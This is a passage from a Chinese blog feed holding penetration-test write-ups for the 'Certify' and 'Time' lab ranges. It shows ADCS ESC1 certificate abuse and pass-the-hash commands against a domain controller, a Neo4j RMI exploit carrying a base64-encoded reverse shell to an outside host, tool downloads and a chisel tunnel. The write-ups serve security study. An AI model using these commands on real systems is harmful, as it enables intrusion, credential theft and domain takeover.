XIAORANG.LAB<span class="token punctuation">\</span>Administrator        Write Owner Principals          <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator        Write Dacl Principals           <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator        Write Property Principals       <span class="token builtin class-name">:</span> XIAORANG.LAB<span class="token punctuation">\</span>Domain Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Enterprise Admins                                          XIAORANG.LAB<span class="token punctuation">\</span>Administrator    <span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Vulnerabilities      ESC1                              <span class="token builtin class-name">:</span> <span class="token string">'XIAORANG.LAB\\Domain Users'</span> and <span class="token string">'XIAORANG.LAB\\Authenticated Users'</span> can enroll, enrollee supplies subject and template allows client authentication<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>虽然默认也有 ESC8, 但是因为 AD DS 和 AD CS 是在同一台机器上的, 所以无法进行 NTLM Relay</p><p>下面利用 ESC1，参考：<a href="https://blog.csdn.net/Adminxe/article/details/129353293">https://blog.csdn.net/Adminxe/article/details/129353293</a></p><p>这里注意改一下host，没改host连接会超时，把域里那两条都加上</p><p>利用XR Manager模板为域管请求证书</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy req <span class="token parameter variable">-u</span> <span class="token string">'liupeng@xiaorang.lab'</span> <span class="token parameter variable">-p</span> <span class="token string">'fiAzGwEMgTY'</span> <span class="token parameter variable">-target</span> <span class="token number">172.22</span>.9.7 -dc-ip <span class="token number">172.22</span>.9.7 <span class="token parameter variable">-ca</span> <span class="token string">"xiaorang-XIAORANG-DC-CA"</span> <span class="token parameter variable">-template</span> <span class="token string">'XR Manager'</span>  <span class="token parameter variable">-upn</span> administrator@xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着转换格式，请求TGT，DCSync或者PTT</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains certipy auth <span class="token parameter variable">-pfx</span> administrator.pfx -dc-ip <span class="token number">172.22</span>.9.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到域管哈希，PTH获取域控权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbexec.py <span class="token parameter variable">-hashes</span> :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.26<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag03.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 smbexec.py <span class="token parameter variable">-hashes</span> :2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7<span class="token builtin class-name">type</span> c:<span class="token punctuation">\</span>users<span class="token punctuation">\</span>administrator<span class="token punctuation">\</span>flag<span class="token punctuation">\</span>flag04.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/02/26/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Certify/image-20250226112142249.png" alt="image-20250226112142249"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最后一点沙砾，打完这个靶场刚好&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/&quot;&gt;https://fushuling.com/index.php/2023/10/06/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83%C2%B7certify/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bowuchuling.github.io/posts/chunqiuCertify.html&quot;&gt;https://bowuchuling.github.io/posts/chunqiuCertify.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/&quot;&gt;https://exp10it.io/2023/08/chunqiuyunjing-certify-writeup/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="渗透" scheme="http://c1oudfl0w0.github.io/blog/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>春秋云境 Time</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/</id>
    <published>2025-02-25T00:34:39.000Z</published>
    <updated>2025-02-25T07:43:10.295Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/">https://fushuling.com/index.php/2023/08/31/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7time/</a></p><p><a href="https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/">https://exp10it.io/2023/08/chunqiuyunjing-time-writeup/</a></p><p><a href="https://bowuchuling.github.io/posts/chunqiu_Time">https://bowuchuling.github.io/posts/chunqiu_Time</a></p><span id="more"></span><hr><h1 id="Neo4j-RCE"><a href="#Neo4j-RCE" class="headerlink" title="Neo4j RCE"></a>Neo4j RCE</h1><p>fscan 开扫</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">39.98</span>.118.103 <span class="token parameter variable">-p</span> <span class="token number">1</span>-65535<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:22<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:46<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:47<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:1337<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7473<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7474<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:50<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:7687<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:39:57<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:1337 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7473 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.P<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7687 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:00<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:7474 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:06<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">39.98</span>.118.103:37977<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:16<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">39.98</span>.118.103:37977 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">6</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:20<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: neo4j, ssh, webpoc, webtitle<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:21<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 https://39.98.118.103:7687 状态码:400 长度:50     标题:无标题<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 08:40:38<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 扫描已完成: <span class="token number">4</span>/4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7474 端口会进到 Neo4j Browser，开了 1337 端口即 rmi 服务，搜一下有CVE：<a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> rhino_gadget.jar rmi://39.98.118.103:1337 <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEueHgueHgueHgvMzQ1NjcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225090903145.png" alt="image-20250225090903145"></p><p>于是弹 shell 拿到flag</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225091104211.png" alt="image-20250225091104211"></p><p>flag01: <code>flag&#123;e53e9c48-8620-4ba8-8970-b3096bb23654&#125;</code></p><p>提示 Do you know the authentication process of Kerberos?</p><hr><h1 id="信息收集-amp-代理"><a href="#信息收集-amp-代理" class="headerlink" title="信息收集 &amp; 代理"></a>信息收集 &amp; 代理</h1><p>wget 下载需要的工具到靶机的 &#x2F;tmp 下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> vps:80/fscan<span class="token function">wget</span> vps:80/proxy/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>信息收集，fscan 开扫</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">neo4j@ubuntu:/tmp$ <span class="token function">uname</span> <span class="token parameter variable">-a</span><span class="token function">uname</span> <span class="token parameter variable">-a</span>Linux ubuntu <span class="token number">5.4</span>.0-113-generic <span class="token comment">#127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span>neo4j@ubuntu:/tmp$ <span class="token function">ifconfig</span><span class="token function">ifconfig</span>eth0: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">416</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,BROADCAST,RUNNING,MULTICAST<span class="token operator">></span>  mtu <span class="token number">1500</span>        inet <span class="token number">172.22</span>.6.36  netmask <span class="token number">255.255</span>.0.0  broadcast <span class="token number">172.22</span>.255.255        inet6 fe80::216:3eff:fe1a:c242  prefixlen <span class="token number">64</span>  scopeid 0x2<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>link<span class="token operator">></span>        ether 00:16:3e:1a:c2:42  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Ethernet<span class="token punctuation">)</span>        RX packets <span class="token number">257111</span>  bytes <span class="token number">167794559</span> <span class="token punctuation">(</span><span class="token number">167.7</span> MB<span class="token punctuation">)</span>        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>        TX packets <span class="token number">167723</span>  bytes <span class="token number">26424537</span> <span class="token punctuation">(</span><span class="token number">26.4</span> MB<span class="token punctuation">)</span>        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>lo: <span class="token assign-left variable">flags</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator"><span class="token file-descriptor important">3</span>&lt;</span>UP,LOOPBACK,RUNNING<span class="token operator">></span>  mtu <span class="token number">65536</span>        inet <span class="token number">127.0</span>.0.1  netmask <span class="token number">255.0</span>.0.0        inet6 ::1  prefixlen <span class="token number">128</span>  scopeid 0x1<span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>host<span class="token operator">></span>        loop  txqueuelen <span class="token number">1000</span>  <span class="token punctuation">(</span>Local Loopback<span class="token punctuation">)</span>        RX packets <span class="token number">1396</span>  bytes <span class="token number">119685</span> <span class="token punctuation">(</span><span class="token number">119.6</span> KB<span class="token punctuation">)</span>        RX errors <span class="token number">0</span>  dropped <span class="token number">0</span>  overruns <span class="token number">0</span>  frame <span class="token number">0</span>        TX packets <span class="token number">1396</span>  bytes <span class="token number">119685</span> <span class="token punctuation">(</span><span class="token number">119.6</span> KB<span class="token punctuation">)</span>        TX errors <span class="token number">0</span>  dropped <span class="token number">0</span> overruns <span class="token number">0</span>  carrier <span class="token number">0</span>  collisions <span class="token number">0</span>neo4j@ubuntu:/tmp$ ./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.6.36/24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.36     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.38     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.12     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:07<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 目标 <span class="token number">172.22</span>.6.25     存活 <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活主机数量: <span class="token number">4</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 有效端口数量: <span class="token number">233</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.38:80<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.38:22<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.36:22<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:88<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:445<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:445<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:389<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:139<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:139<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.25:135<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.12:135<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 端口开放 <span class="token number">172.22</span>.6.36:7687<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.38:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:13<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.36:22 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ssh<span class="token punctuation">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span> Banner:<span class="token punctuation">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.38:80 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>http<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:88 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:18<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:445 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:445 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:389 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span>ldap<span class="token punctuation">]</span> 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:139 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:139 <span class="token operator">=</span><span class="token operator">></span>  Banner:<span class="token punctuation">[</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:19:24<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.36:7687 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.25:135 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 服务识别 <span class="token number">172.22</span>.6.12:135 <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 存活端口数量: <span class="token number">12</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: findnet, ldap, ms17010, neo4j, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.6.12主机名: DC-PROGAME发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.6.12<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.6.12 <span class="token punctuation">[</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.6.25     XIAORANG<span class="token punctuation">\</span>WIN2019              <span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果目标主机: <span class="token number">172.22</span>.6.25主机名: WIN2019发现的网络接口:   IPv4地址:      └─ <span class="token number">172.22</span>.6.25<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 https://172.22.6.36:7687  状态码:400 长度:50     标题:无标题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整理一下</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.22.6.12 DC-PROGAME172.22.6.25 WIN2019172.22.6.36 Neo4j172.22.6.38 Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>起代理</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><p>先看 172.22.6.38 这个网站后台</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225092910914.png" alt="image-20250225092910914"></p><p>bp 配置 socks 代理抓包测试</p><p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225093031631.png" alt="image-20250225093031631"></p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.22.6.38</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span 